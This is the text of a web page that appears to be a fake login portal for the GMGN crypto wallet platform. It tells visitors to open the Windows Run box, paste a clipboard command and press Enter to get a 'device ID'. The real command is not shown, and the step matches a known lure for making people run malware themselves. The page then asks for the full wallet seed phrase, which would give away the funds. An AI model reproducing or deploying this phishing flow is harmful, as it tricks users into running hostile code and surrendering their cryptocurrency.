Choose access type

Select to create a new account or login to an existing account to access the secure GMGN platform.

GMGN

Create new GMGN account

  1. Enter your device ID ?
  2. Click "Confirm ID and Continue"
  3. Follow security setup instructions
  4. Create and save your seed phrase
  5. Set up two-factor authentication
Device ID is valid
Invalid device ID
GMGN

Login to existing account

  1. Enter your device ID ?
  2. Click "Confirm ID and Continue"
  3. Enter your seed phrase
  4. Confirm login with 2FA
  5. Add device to trusted devices list
Device ID is valid
Invalid device ID

GMGN

How to find your device ID?

Secure Access

Your device ID is required for secure access to the GMGN platform.

1

Open Run window

Press Win + R keys on your keyboard

2

Copy the command

check_id_verification
3

Paste into Run window

Use Ctrl + V to paste

4

Execute the command

Press Enter to run

5

Copy the displayed ID

Use this ID to access your account

Command copied to clipboard!
Verified

ID Verified

Your device ID:

GM24691-7832-65473218

This ID is used for authentication and access to the GMGN platform.

GMGN
1
Confirm seed phrase
2
Create password

Restore access to your wallet

GMGN cannot recover your password. We use your seed phrase to confirm ownership, restore your wallet, and create a new password.

I have a 12-word phrase
I have a 15-word phrase
I have a 18-word phrase
I have a 21-word phrase
I have a 24-word phrase
You can paste the entire seed phrase into any field

Create password

This password will unlock your GMGN wallet only on this device. GMGN cannot recover this password.
